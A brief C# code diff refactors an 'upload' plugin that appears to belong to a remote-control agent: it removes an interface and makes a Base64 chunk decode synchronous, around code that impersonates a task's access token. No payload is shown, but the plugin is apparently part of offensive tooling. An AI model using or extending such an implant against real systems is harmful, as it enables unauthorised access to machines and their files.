@@ -7,7 +7,7 @@ using System.Diagnostics;
 
 namespace Agent
 {
-    public class Plugin : IPlugin, IFilePlugin
+    public class Plugin : IFilePlugin
     {
         public string Name => "upload";
         private IMessageManager messageManager { get; set; }
@@ -99,7 +99,7 @@ namespace Agent
             {
                 tokenManager.Impersonate(uploadJob.task.token);
             }
-            await this.HandleNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
+            await this.HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), response.task_id);
             if (uploadJob.task.token != 0)
             {
                 tokenManager.Revert();
